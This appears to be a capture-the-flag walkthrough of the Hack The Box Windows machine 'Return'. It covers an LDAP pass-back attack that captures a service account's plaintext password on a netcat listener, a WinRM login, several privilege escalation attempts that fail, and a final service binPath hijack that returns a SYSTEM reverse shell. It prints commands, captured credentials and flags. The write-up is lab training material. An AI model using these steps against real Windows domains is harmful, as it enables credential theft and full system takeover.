@@ -1,0 +1,145 @@
+HTB Walkthrough: Return
+
+Machine: Return
+ OS: Windows
+ IP: 10.129.95.241
+ Difficulty: Easy
+ Author: Hack The Box
+ Player IP: 10.10.14.147
+
+
+
+Recon
+
+Nmap Scan
+sudo nmap -sC -sV 10.129.95.241 
+  
+Result:
+Port 80 - IIS 10.0 - HTB Printer Admin Panel
+Port 389 - LDAP
+Port 445 - SMB
+Port 5985 - WinRM
+Other AD/Windows ports
+
+Gobuster on Webserver
+gobuster dir -u http://10.129.95.241 -w /usr/share/wordlists/dirb/common.txt
+  
+Interesting Result: /index.php, and /settings.php
+
+Web Panel Inspection
+On /settings.php, an LDAP configuration field revealed:
+Server: printer.return.local
+Port: 389
+Username: svc-printer
+Password: hidden input field
+
+Manual test with a listener: 
+nc -lvnp 389 
+  
+Then changed the LDAP server IP in the web panel to my own (10.10.14.147).
+
+Result:
+connect to [10.10.14.147] from (UNKNOWN) [10.129.95.241] 63109
+0*`%return\svc-printer
+1edFg43012!!
+  
+
+Captured plaintext credentials:
+Username: svc-printer
+Password: 1edFg43012!!
+  
+
+Foothold
+
+WinRM Login 
+evil-winrm -i 10.129.95.241 -u svc-printer -p '1edFg43012!!' 
+  
+Success!
+
+User flag
+C:\Users\svc-printer\Desktop\user.txt
+089b0698ab4ac07db513eb6e73d49a80
+
+
+Privilege Enumeration
+
+Group Memberships:
+
+Print Operators 
+Server Operators 
+Remote Management Users 
+Domain Users 
+
+Privileges:
+SeBackupPrivilege
+SeRestorePrivilege
+SeLoadDriverPrivilege
+
+Tested Privilege Escalation Techniques:
+
+🔴 sc.exe create → Access Denied
+sc.exe create evilsvc binPath= "C:\Users\svc-printer\evil.exe"
+  
+
+🔴 vssadmin → No elevated prompt
+vssadmin create shadow /for=C:
+Error: You don't have the correct permissions
+  
+
+🔴 PrintSpoofer.exe → Missing SeImpersonatePrivilege
+PrintSpoofer64.exe -i -c cmd.exe
+[-] A privilege is missing: 'SeImpersonatePrivilege'
+  
+
+🔴 schtasks → Access Denied
+schtasks /create ... /ru SYSTEM
+Program 'schtasks.exe' failed to run: Access is denied
+  
+
+🔴 psexec.py and smbexec.py → NTLM-auth blocked
+STATUS_LOGON_FAILURE
+  
+
+🔴 Administrator hash not crackable
+34386a771aaca697f447754e4863d38a
+john/hashcat → 0g
+  
+
+ 
+
+Working Privilege Escalation via Existing Service (Server Operators)
+Ultimately abused the fact that Server Operators are allowed to modify existing services.
+
+Start Listener:
+nc -lvnp 4444
+  
+
+Reconfigure Service:
+sc.exe config vss binPath= "C:\Users\svc-printer\Desktop\evil.exe"
+sc.exe stop vss
+sc.exe start vss
+  
+
+SYSTEM reverse shell returned via netcat:
+whoami
+nt authority\system
+  
+
+Root flag 
+C:\Users\Administrator\Desktop\root.txt
+0cb57b0660c0f2d61d818f3f331415ef
+  
+
+ 
+
+Conclusion 
+
+This box highlighted: 
+The dangers of exposed or editable LDAP configuration
+How plaintext credentials can leak
+The power of Windows groups like Server Operators
+How multiple privilege escalation paths can be blocked
+And most of all: thinking creatively beyond standard exploits is key.
+Full OWN achieved by leveraging group membership and system misconfigurations effectively.
+
+ 
